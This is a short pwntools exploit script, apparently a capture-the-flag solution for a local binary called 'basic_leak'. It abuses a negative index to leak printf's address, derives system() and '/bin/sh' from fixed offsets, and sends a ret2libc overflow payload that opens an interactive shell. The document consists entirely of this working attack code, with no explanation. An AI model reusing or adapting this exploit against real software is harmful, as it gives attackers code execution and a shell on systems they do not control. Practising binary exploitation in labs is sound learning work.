from pwn import *
context(terminal = ['xterm', 'splitw'])
payload = 'b'*8

system_off = -59600
binsh_off = 0x11233b

p = process('./basic_leak')
#gdb.attach(p)

p.sendline(str(2))
p.sendline(str(-18))
p.recvuntil('title : ')

printf = p.recvn(4)
system_addr = u32(printf) + system_off
binsh_addr = u32(printf) + binsh_off

log.info('printf addr = ' + hex(u32(printf)))
log.progress('system addr = ' + hex(system_addr))
log.progress('binsh addr = ' + hex(binsh_addr))

payload += p32(system_addr)
payload += p32(0)
payload += p32(binsh_addr)

p.sendline(str(1))
p.send('a' * 20)
p.send(payload)
log.success('got the shell')
p.clean()
p.interactive()
